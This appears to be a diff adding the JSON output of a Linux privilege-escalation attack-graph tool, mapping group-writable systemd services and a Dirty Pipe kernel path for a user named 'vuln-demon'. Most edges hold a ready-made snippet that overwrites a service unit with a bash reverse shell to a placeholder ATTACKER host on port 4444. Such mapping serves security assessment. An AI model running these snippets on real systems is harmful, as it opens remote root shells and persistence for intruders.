+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e177",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-journald.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-journald.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-journald.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e178",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-machine-id-commit.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e179",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-modules-load.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-modules-load.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-modules-load.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e180",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-random-seed.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-random-seed.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-random-seed.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e181",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-sysctl.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-sysctl.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-sysctl.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e182",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-sysusers.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e183",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-tmpfiles-setup-dev.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup-dev.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup-dev.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e184",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-tmpfiles-setup.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e185",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-udev-trigger.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e186",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-udevd.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-udevd.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-udevd.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e187",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-update-utmp.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-update-utmp.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-update-utmp.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e188",
+      "source": "user:vuln-demon",
+      "target": "service:fwupd-offline-update.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/system-update.target.wants/fwupd-offline-update.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/system-update.target.wants/fwupd-offline-update.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e189",
+      "source": "user:vuln-demon",
+      "target": "service:packagekit-offline-update.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/system-update.target.wants/packagekit-offline-update.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/system-update.target.wants/packagekit-offline-update.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e190",
+      "source": "user:vuln-demon",
+      "target": "service:udev.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/udev.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/udev.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e191",
+      "source": "user:vuln-demon",
+      "target": "service:x11-common.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/x11-common.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/x11-common.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e192",
+      "source": "user:vuln-demon",
+      "target": "user:root",
+      "type": "KernelExploit",
+      "risk": "high",
+      "properties": {
+        "cve": "CVE-2022-0847",
+        "description": "Dirty Pipe - overwrite data in arbitrary read-only files",
+        "kernel_version": "5.4.0-80-generic",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"
+      }
+    }
+  ],
+  "stats": {
+    "total_nodes": 285,
+    "total_edges": 192,
+    "paths_to_root": 0
+  }
+}
